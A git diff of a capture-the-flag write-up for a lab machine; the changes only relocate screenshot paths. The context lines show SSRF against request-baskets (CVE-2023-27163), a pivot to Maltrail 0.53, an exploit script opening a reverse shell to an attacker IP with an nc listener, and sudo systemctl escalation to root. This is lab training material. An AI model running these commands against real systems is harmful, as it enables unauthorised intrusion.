@@ -41,7 +41,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.229.26
 ```
 
-![ping](sau_01_ping.png)
+![ping](screenshots/sau_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -59,7 +59,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.26 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](sau_02_nmap_allports.png)
+![allports](screenshots/sau_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -67,7 +67,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](sau_03_extractports.png)
+![extractports](screenshots/sau_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -83,8 +83,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](sau_04_nmap_targeted_1.png)
-![targeted 2](sau_05_nmap_targeted_2.png)
+![targeted 1](screenshots/sau_04_nmap_targeted_1.png)
+![targeted 2](screenshots/sau_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -104,11 +104,11 @@ The targeted scan shows an unusual Go HTTP stack and a **`302`** toward **`/web`
 whatweb http://10.129.229.26:55555/
 ```
 
-![whatweb request baskets](sau_06_whatweb.png)
+![whatweb request baskets](screenshots/sau_06_whatweb.png)
 
 The **`/web`** surface exposes basket creation flows over **`POST /api/baskets/<name>`** (visible in page scripts). The footer identifies **request-baskets v1.2.1**.
 
-![request baskets web ui](sau_07_request_baskets_web_ui.png)
+![request baskets web ui](screenshots/sau_07_request_baskets_web_ui.png)
 
 ---
 ### 2.2 SSRF proof toward an attacker-controlled listener (CVE-2023-27163)
@@ -127,7 +127,7 @@ nc -lvnp 8000
 curl -i 'http://10.129.229.26:55555/<basket_from_script_output>'
 ```
 
-![ssrf attacker nc proof](sau_08_ssrf_attacker_nc.png)
+![ssrf attacker nc proof](screenshots/sau_08_ssrf_attacker_nc.png)
 
 ---
 ### 2.3 Pivot `forward_url` to localhost (Maltrail discovery)
@@ -139,15 +139,15 @@ After SSRF is confirmed, repoint **`forward_url`** to **`http://127.0.0.1/`** (s
 curl -i 'http://10.129.229.26:55555/sevwog'
 ```
 
-![ssrf localhost basket create](sau_09_ssrf_localhost_basket_create.png)
+![ssrf localhost basket create](screenshots/sau_09_ssrf_localhost_basket_create.png)
 
 The proxied response exposes **`Server: Maltrail/0.53`** and HTML referencing **Maltrail v0.53**.
 
-![maltrail curl via basket](sau_10_maltrail_via_basket_curl.png)
+![maltrail curl via basket](screenshots/sau_10_maltrail_via_basket_curl.png)
 
 Loading the basket URL in a browser shows the dashboard chrome (static assets may load inconsistently through the proxy).
 
-![maltrail browser dashboard](sau_11_maltrail_browser_dashboard.png)
+![maltrail browser dashboard](screenshots/sau_11_maltrail_browser_dashboard.png)
 
 ---
 ## 3. Foothold
@@ -163,7 +163,7 @@ nc -lvnp 443
 python3 exploit.py 10.10.15.206 443 http://10.129.229.26:55555/sevwog
 ```
 
-![maltrail exploit shell user flag](sau_12_maltrail_exploit_shell_user_flag.png)
+![maltrail exploit shell user flag](screenshots/sau_12_maltrail_exploit_shell_user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -189,7 +189,7 @@ whoami
 cat /root/root.txt
 ```
 
-![sudo systemctl root flag](sau_13_sudo_systemctl_root_flag.png)
+![sudo systemctl root flag](screenshots/sau_13_sudo_systemctl_root_flag.png)
 
 🏁 **Root flag obtained**
 
